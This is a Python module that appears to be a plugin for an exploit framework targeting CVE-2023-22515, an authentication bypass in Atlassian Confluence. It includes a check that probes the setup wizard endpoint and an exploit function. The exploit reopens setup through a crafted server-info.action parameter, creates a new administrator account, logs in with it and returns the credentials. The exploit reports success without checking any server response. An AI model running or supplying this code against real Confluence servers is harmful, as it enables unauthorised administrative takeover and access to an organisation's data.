"""CVE-2023-22515 - Atlassian Confluence Authentication Bypass."""

from __future__ import annotations

import requests


def check(target: str) -> dict:
    """Probe whether *target* exposes the setup wizard endpoint."""
    try:
        resp = requests.get(
            f"{target}/setup/setupadministrator.action",
            timeout=10,
        )
        vulnerable = resp.status_code == 200
        return {"cve": "CVE-2023-22515", "vulnerable": vulnerable}
    except requests.RequestException as exc:
        return {"cve": "CVE-2023-22515", "vulnerable": False, "error": str(exc)}


def exploit(
    target: str,
    *,
    username: str,
    password: str,
) -> dict:
    """Create an admin account via the re-activated setup wizard."""
    session = requests.Session()
    try:
        session.get(
            f"{target}/server-info.action"
            "?bootstrapStatusProvider.applicationConfig.setupComplete=false",
            timeout=10,
        )
        session.post(
            f"{target}/setup/setupadministrator.action",
            data={
                "username": username,
                "password": password,
                "confirm": password,
                "fullName": username,
            },
            timeout=10,
        )
        session.post(
            f"{target}/dologin.action",
            data={"os_username": username, "os_password": password},
            timeout=10,
        )
        return {
            "cve": "CVE-2023-22515",
            "success": True,
            "credentials": {"username": username, "password": password},
        }
    except requests.RequestException as exc:
        return {"cve": "CVE-2023-22515", "success": False, "error": str(exc)}
